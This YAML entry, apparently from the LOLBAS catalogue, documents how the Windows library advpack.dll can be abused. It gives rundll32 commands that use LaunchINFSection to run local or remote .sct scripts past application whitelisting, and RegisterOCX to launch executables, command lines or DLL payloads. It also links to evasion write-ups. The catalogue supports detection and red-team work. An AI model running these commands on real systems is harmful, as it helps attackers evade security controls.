---
name: advpack.dll
description: Legitimately used for installing of software and drivers.
functions:
  awl-bypass:
    - description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).
      code: rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
    - description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).
      code: rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,,1,
  execute:
    - description: Launch executable by calling the RegisterOCX function.
      code: rundll32.exe advpack.dll,RegisterOCX calc.exe
    - description: Launch command line by calling the RegisterOCX function.
      code: rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"
    - description: Launch a DLL payload by calling the RegisterOCX function.
      code: rundll32.exe advpack.dll,RegisterOCX test.dll
resources:
    - resource: https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
    - resource: https://twitter.com/ItsReallyNick/status/967859147977850880
    - resource: https://twitter.com/bohops/status/974497123101179904
    - resource: https://twitter.com/moriarty_meng/status/977848311603380224
    - resource: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack.inf
    - resource: https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack_calc.sct
fullpath: 
    - path: c:\windows\system32\advpack.dll
    - path: c:\windows\syswow64\advpack.dll
notes: Thanks to Jimmy - @bohops (LaunchINFSection), fabrizio - @0rbz_ (RegisterOCX - DLL), Moriarty @moriarty_meng (RegisterOCX - Cmd), Nick Carr - @ItsReallyNick
---